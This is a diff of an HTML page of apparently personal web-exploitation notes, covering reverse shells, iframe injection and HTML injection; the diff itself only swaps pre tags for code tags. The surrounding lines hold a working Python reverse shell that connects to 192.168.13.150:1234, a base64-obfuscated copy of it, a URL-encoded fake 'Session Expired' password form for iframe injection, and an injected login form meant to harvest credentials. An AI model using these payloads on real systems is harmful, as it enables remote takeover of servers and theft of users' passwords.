@@ -25,9 +25,9 @@ Well we can go for a custom shell in a language of our choice
 </li> 
 <li><h3>Method 3:Python shell(any language installed on backend)</h3>
 Set up a listener on attacker machine
-<pre>
+<code>
 python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('192.168.13.150',1234))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
-</pre>
+</code>
 For obfuscation , we could also base64 encode and decode string
 python -c "exec('aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgo\n4oCYMTkyLjE2OC4xMy4xNTDigJksOTAwMCkpCndoaWxlIDE6ICBwcm9jID0gc3VicHJvY2Vzcy5Q\nb3BlbihzLnJlY3YoMTAyNCksIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0\nZGVycj1zdWJwcm9jZXNzLlBJUEUsIHN0ZGluPXN1YnByb2Nlc3MuUElQRSk7cy5zZW5kKHByb2Mu\nc3Rkb3V0LnJlYWQoKStwcm9jLnN0ZGVyci5yZWFkKCkp\n'.decode('base64'))"
 </li>
@@ -40,9 +40,9 @@ Deploying a Meterpreter shell is one way to create a well obfuscated persisitent
 	<p> iframe sources should never be allowed to be controlled by user input, as the iframe can load potential malware from other site. There are other security risks as well. I found this blog very helpful.
 	<a href="https://stackoverflow.com/questions/7289139/why-are-iframes-considered-dangerous-and-a-security-risk?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa">Why Iframes pose a security risk?</a>
 	We can corrupt the iframe src to load xss attacking page from our server or even an AJAX request to our site. We can inject this to the vulnerable parameter and let the fun unroll, or even a remote html page from the attacking server of our choice. 
-	<pre>
+	<code>
 		%3Ch1%3ESession+Expired%3C%2Fh1%3E%0D%0A%3Cform+action%3D%22Marale%22%3E%0D%0A%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22password%22%2F%3E%0D%0A%3Cinput+name%3D%22name%22+placeholder%3D%22name%22%2F%3E%0D%0A%3Cinput+type%3D%22submit%22%2F%3E%0D%0A%3C%2Fform%3E%3C%21--
-	</pre> 
+	</code> 
 </li>
 <li><h2>HTML Injection </h2>
 	When there is a vulnerability in the application which allow you to inject HTML into code.
@@ -52,13 +52,13 @@ Deploying a Meterpreter shell is one way to create a well obfuscated persisitent
 	<ul>
 		<li><h3>Basic</h3>
 		<p>Simple case, where the input fields visible are vulnerable to HTML injection. You may use any of the web pages, <b>"Add to your Blog"</b> is what I have exploited. Make sure not to use single quotes or else the SQL query will explode</p>
-		<pre>
+		<code>
 <form action="/attacked">
 <input name="user"/>
 <input id='ps' type="password" name="pass"/>
 <button type="submit">Register</button>
 </form>
-		</pre>
+		</code>
 	</li>
 	<li>
 		<h3>Via HTTP Headers</h3>
@@ -66,8 +66,8 @@ Deploying a Meterpreter shell is one way to create a well obfuscated persisitent
 			These exploits can work under a man in the middle the attack, or a clever manipulation of the iframe header to load the web page silently in the background. The target page here is DNS lookup page. We must always check the context and filters on the 
 			Using Burp intercept the outgoing request.
 		</p>
-		<pre>
-		</pre>
+		<code>
+		</code>
 	</li>
 	<li>DOM Manipulation</li>
 	<li>Cookie Manipulation</li>
